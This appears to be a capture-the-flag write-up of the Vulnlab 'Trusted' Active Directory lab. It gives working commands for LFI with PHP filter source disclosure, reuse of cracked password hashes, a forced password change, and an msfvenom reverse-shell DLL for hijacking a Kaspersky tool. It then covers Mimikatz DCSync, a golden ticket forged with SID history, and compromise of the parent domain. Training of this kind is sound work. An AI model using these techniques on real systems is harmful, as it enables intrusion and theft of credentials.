# Trusted -- Vulnlab Chain (write-up)

**Difficulty:** Hard
**Box:** Trusted (Vulnlab)
**Author:** dsec
**Date:** 2024-09-27

---

## TL;DR

### LFI on a dev web app leaked MySQL creds via PHP filter. MySQL had user hashes -- cracked one, used BloodHound to map a path through ForceChangePassword, DLL hijacking on Kaspersky removal tool, cross-domain trust abuse with golden ticket, and DCSync on the parent domain.
---
## Target info

- Host 1: `10.10.220.21` / `10.10.146.117`
- Host 2: `10.10.220.22` / `10.10.146.118`
- Domain: `lab.trusted.vl` / `trusted.vl`
---
## Enumeration

```bash
sudo nmap -Pn -n 10.10.220.21 -sCV -p- --open -vvv
```

![Nmap host 1](images/trusted-vl-chain_1.png)

![Nmap host 1 continued](images/trusted-vl-chain_2.png)

```bash
sudo nmap -Pn -n 10.10.220.22 -sCV -p- --open -vvv
```

![Nmap host 2](images/trusted-vl-chain_3.png)

![Nmap host 2 continued](images/trusted-vl-chain_4.png)

![Nmap host 2 continued](images/trusted-vl-chain_5.png)

---
## Web enumeration -- LFI

Found a `/dev` directory -- don't ignore 301s, anything dev could be useful.

![Dev directory](images/trusted-vl-chain_6.png)

![Dev page](images/trusted-vl-chain_7.png)

About page had a `?view=` parameter.

![About page](images/trusted-vl-chain_8.png)

Tested for LFI:

```
http://10.10.146.118/dev/index.html?view=C:/WINDOWS/System32/drivers/etc/hosts
```

![LFI confirmed](images/trusted-vl-chain_9.png)

Used PHP filter to get encoded source of index.html (in case it includes extra PHP code not visible in view-source):

```
10.10.146.118/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\index.html
```

![PHP filter output](images/trusted-vl-chain_10.png)

Decoded with CyberChef:

![CyberChef decode](images/trusted-vl-chain_11.png)

View-source for comparison:

![View source](images/trusted-vl-chain_12.png)

Source code also shows a comment hinting at more PHP files:

![Source comment](images/trusted-vl-chain_13.png)

Fuzzed for PHP files:

```bash
feroxbuster -u http://10.10.220.22/dev/ -x php
```

![Feroxbuster results](images/trusted-vl-chain_14.png)

Found `db.php`. Used PHP filter + CyberChef to read it:

![db.php filtered](images/trusted-vl-chain_15.png)

![db.php decoded](images/trusted-vl-chain_16.png)

Creds: `root:SuperSecureMySQLPassw0rd1337.`

---
## MySQL enumeration

![MySQL login](images/trusted-vl-chain_17.png)

```sql
show databases;
```

![Databases](images/trusted-vl-chain_18.png)

```sql
use news;
show tables;
select * from users;
```

![Users table](images/trusted-vl-chain_19.png)

- `rsmith:7e7abb54bbef42f0fbfa3007b368def7` -- CrackStation: `IHateEric2`
- `ewalters:d6e81aeb4df9325b502a02f11043e0ad`
- `cpowers:e3d3eb0f46fe5d75eed8d11d54045a60`

---
## BloodHound

![RDP as rsmith](images/trusted-vl-chain_20.png)

Initial BloodHound collection failed, so I used dnschef to fake DNS:

```bash
dnschef --fakeip 10.10.146.118
```

![dnschef running](images/trusted-vl-chain_22.png)

```bash
bloodhound-python -c All -dc labdc.lab.trusted.vl -ns 127.0.0.1 -d lab.trusted.vl -u rsmith -p 'IHateEric2'
```

![BloodHound collection](images/trusted-vl-chain_23.png)

Marked rsmith as owned, checked reachable high value targets:

![BloodHound path](images/trusted-vl-chain_24.png)

---
## ForceChangePassword -- ewalters

```bash
rpcclient -U 'rsmith' //10.10.146.118
setuserinfo2 ewalters 23 "d4nk!!!"
```

![Password change](images/trusted-vl-chain_25.png)

![ewalters access](images/trusted-vl-chain_26.png)

---
## DLL hijacking -- Kaspersky removal tool

![Christine running Kaspersky exe](images/trusted-vl-chain_27.png)

Christine is running that Kaspersky exe -- possible DLL injection.

Evil-WinRM file upload failed -- Constrained Language Mode was preventing scripts.

![Upload error](images/trusted-vl-chain_28.png)

Used SMB server instead to transfer files:

![SMB server](images/trusted-vl-chain_29.png)

![SMB transfer](images/trusted-vl-chain_30.png)

Ran procmon.exe on host to analyze the Kaspersky removal tool:

![Procmon](images/trusted-vl-chain_31.png)

Ran the Kaspersky removal tool:

![Kaspersky tool](images/trusted-vl-chain_32.png)

Filtered procmon: Process Name contains KasperskyRemovalTool, Path ends with .dll, Result is NAME NOT FOUND:

![Procmon filter 1](images/trusted-vl-chain_33.png)

![Procmon filter 2](images/trusted-vl-chain_34.png)

![Procmon filter 3](images/trusted-vl-chain_35.png)

![Procmon filtered results](images/trusted-vl-chain_36.png)

Targeted `KasperskyRemovalToolENU.dll` since the executable attempts to load it multiple times.

![PE32 check](images/trusted-vl-chain_37.png)

Executable is PE32, so need a 32-bit DLL:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.2.206 LPORT=2222 -f dll > KasperskyRemovalToolENU.dll
```

Transferred to share, copied to directory, waited a few seconds:

![Shell as cpowers](images/trusted-vl-chain_38.png)

Shell as cpowers -- member of Domain Admins, access to administrator flag.

---
## Cross-domain trust abuse

```powershell
nltest.exe /trusted_domains
```

![Trusted domains](images/trusted-vl-chain_39.png)

Transferred and ran mimikatz:

```
lsadump::dcsync /domain:lab.trusted.vl /all
```

Grabbed krbtgt NTLM hash:

![krbtgt hash](images/trusted-vl-chain_40.png)

`c7a03c565c68c6fac5f8913fab576ebd`

```
lsadump::trust /patch
```

![Trust SIDs](images/trusted-vl-chain_41.png)

- `S-1-5-21-2241985869-2159962460-1278545866`
- `S-1-5-21-3576695518-347000760-3731839591`

Created golden ticket with SID history for Enterprise Admins on parent domain:

```
kerberos::golden /user:Administrator /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt
```

![Golden ticket](images/trusted-vl-chain_42.png)

DCSync on parent domain:

```
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```

![DCSync parent domain](images/trusted-vl-chain_43.png)

Admin hash: `15db914be1e6a896e7692f608a9d72ef`

---
## Encrypted flag

root.txt was encrypted:

![Encrypted flag](images/trusted-vl-chain_44.png)

Had to use RunasCs.exe. Verified with:

```
cipher /u /n
```

![Cipher check](images/trusted-vl-chain_45.png)

---
## Lessons & takeaways

- Don't ignore 301 redirects -- `/dev` directories are gold
- PHP filters bypass view-source limitations and reveal server-side code
- Constrained Language Mode blocks evil-winrm uploads -- pivot to SMB
- Cross-domain trust abuse: child domain DA + krbtgt hash + trust SIDs = parent domain compromise
